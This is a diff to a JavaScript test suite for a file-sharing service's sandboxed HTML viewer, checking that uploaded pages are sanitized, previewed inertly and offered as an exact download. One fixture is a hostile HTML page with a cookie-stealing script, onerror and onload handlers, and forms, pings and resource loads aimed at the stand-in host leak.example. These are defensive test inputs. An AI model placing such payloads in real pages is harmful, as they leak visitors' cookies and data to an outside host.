@@ -93,8 +93,15 @@ describe("safe human viewers", () => {
     expect(viewer.headers.get("referrer-policy")).toBe("no-referrer");
     expect(viewer.headers.get("content-security-policy")).toContain("default-src 'none'");
     expect(html).toContain("<h1>Safe heading</h1>");
+    expect(html).toContain('id="theme-toggle"');
+    expect(html).toContain('data-expiry-countdown="true"');
+    expect(html).toContain("Download exact file");
+    expect(html).toContain('data-viewer-mode="rendered"');
+    expect(html).toContain('data-viewer-mode="raw"');
+    expect(html).toContain("# Safe heading");
+    expect(html).toContain('class="site-header"');
+    expect(html).not.toContain("Georgia");
     expect(html).not.toContain("<script>document.cookie");
-    expect(html).not.toContain("onerror");
     expect(html).not.toContain('src="https://leak.example');
     expect(html).not.toContain('href="https://leak.example');
 
@@ -103,19 +110,63 @@ describe("safe human viewers", () => {
     expect(raw.headers.get("content-disposition")).toContain("attachment");
   });
 
-  it("places sanitized HTML in a sandbox without scripts, external loads, or same-origin privilege", async () => {
-    const source = '<h1>Readable</h1><script>parent.document.cookie</script><img src="https://leak.example/x"><a href="/api/artifacts">write</a>';
+  it("uses a neutralized HTML preview while retaining the exact source and download", async () => {
+    const source = [
+      "<!doctype html>",
+      '<html><head><meta http-equiv="refresh" content="0;url=https://leak.example/refresh">',
+      '<base href="https://leak.example/"><link rel="stylesheet" href="https://leak.example/site.css">',
+      '<style>.hero { color: rebeccapurple; background: url(https://leak.example/style.png) }</style></head>',
+      '<body onload="parent.document.body.dataset.pwned=\'true\'">',
+      '<h1 class="hero">Readable</h1><script>parent.document.cookie</script>',
+      '<img src="https://leak.example/image.png" onerror="fetch(\'/api/artifacts\')">',
+      '<a href="https://leak.example/click" target="_top" ping="https://leak.example/ping">write</a>',
+      '<form action="https://leak.example/form" method="post"><input name="secret"><button formaction="https://leak.example/button">Send</button></form>',
+      '<iframe src="https://leak.example/frame"></iframe><object data="https://leak.example/object"></object>',
+      "</body></html>",
+    ].join("");
     const created = await upload("hostile.html", "text/html", source);
     const viewer = await fetch(created.share_url, undefined, request);
     const html = await viewer.text();
 
     expect(html).toContain("<iframe");
     expect(html).toContain('sandbox=""');
+    expect(html).toContain('data-viewer-mode="preview"');
+    expect(html).toContain('data-viewer-mode="source"');
+    expect(html).toContain("parent.document.cookie");
     expect(html).not.toContain("allow-same-origin");
-    expect(html).not.toContain("parent.document.cookie");
-    expect(html).not.toContain("https://leak.example");
-    expect(html).not.toContain("/api/artifacts");
-    expect(await (await fetch(`${created.share_url}/raw`, undefined, request)).text()).toBe(source);
+    expect(html).not.toContain("<script>parent.document.cookie</script>");
+    expect(html).toContain(`${new URL(created.share_url).pathname}/preview`);
+
+    const preview = await fetch(`${created.share_url}/preview`, undefined, request);
+    const previewSource = await preview.text();
+    expect(previewSource).toContain('<h1 class="hero">Readable</h1>');
+    expect(previewSource).toContain("color: rebeccapurple");
+    expect(previewSource).not.toContain("background: url(");
+    expect(previewSource).toContain("<form");
+    expect(previewSource).toContain("inert");
+    expect(previewSource).toContain("disabled");
+    expect(previewSource).not.toContain("<script");
+    expect(previewSource).not.toContain("<iframe");
+    expect(previewSource).not.toContain("<object");
+    expect(previewSource).not.toContain("http-equiv");
+    expect(previewSource).not.toContain("<base");
+    expect(previewSource).not.toContain("<link");
+    expect(previewSource).not.toContain('onload=');
+    expect(previewSource).not.toContain('onerror=');
+    expect(previewSource).not.toContain('href="https://leak.example');
+    expect(previewSource).not.toContain('src="https://leak.example');
+    expect(previewSource).not.toContain('action="https://leak.example');
+    expect(previewSource).not.toContain('formaction="https://leak.example');
+    expect(previewSource).not.toContain('target="_top"');
+    expect(previewSource).not.toContain('ping="https://leak.example');
+    expect(preview.headers.get("content-disposition")).toContain("inline");
+    expect(preview.headers.get("content-security-policy")).toContain("sandbox");
+    expect(preview.headers.get("content-security-policy")).toContain("default-src 'none'");
+    expect(preview.headers.get("content-security-policy")).toContain("style-src 'unsafe-inline'");
+    expect(preview.headers.get("content-security-policy")).toContain("frame-ancestors 'self'");
+    const raw = await fetch(`${created.share_url}/raw`, undefined, request);
+    expect(await raw.text()).toBe(source);
+    expect(raw.headers.get("content-disposition")).toContain("attachment");
   });
 
   it("embeds an inline PDF, supports ranges, and keeps exact download separate", async () => {
@@ -124,7 +175,9 @@ describe("safe human viewers", () => {
     const viewer = await fetch(created.share_url, undefined, request);
     const html = await viewer.text();
     expect(html).toContain(`<iframe`);
+    expect(html).toContain('title="PDF document"');
     expect(html).toContain(`${new URL(created.share_url).pathname}/content`);
+    expect(html).not.toContain('role="tablist"');
     expect(html).not.toContain("sandbox");
 
     const fullContent = await fetch(`${created.share_url}/content`, undefined, request);
@@ -165,10 +218,13 @@ describe("safe human viewers", () => {
     expect(html).toContain(`data-expires-at="${created.manifest.expires_at}"`);
     expect(html).toContain("setTimeout");
     expect(html).toContain("Artifact expired");
+    expect(html).toContain("Share a document");
+    expect(html).toContain('/?upload=1');
 
     vi.setSystemTime(now + 900_000);
     expect((await fetch(created.share_url, undefined, request)).status).toBe(404);
     expect((await fetch(`${created.share_url}/content`, undefined, request)).status).toBe(404);
+    expect((await fetch(`${created.share_url}/preview`, undefined, request)).status).toBe(404);
   });
 
   it.each(["/dashboard", "/history", "/settings"])("does not expose %s", async (path) => {
